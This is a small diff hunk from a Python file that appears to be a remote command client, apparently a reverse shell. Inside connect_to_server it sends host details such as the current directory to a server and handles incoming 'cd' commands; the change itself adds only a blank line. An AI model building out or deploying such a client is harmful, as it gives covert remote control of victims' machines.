@@ -44,6 +44,7 @@ def connect_to_server():
                             f"Current Directory: {os.getcwd()}\n"
                         )
                         client.send(info.encode())
+
                     elif command.startswith("cd "):
                         # Change the current working directory
                         path = command[3:].strip()
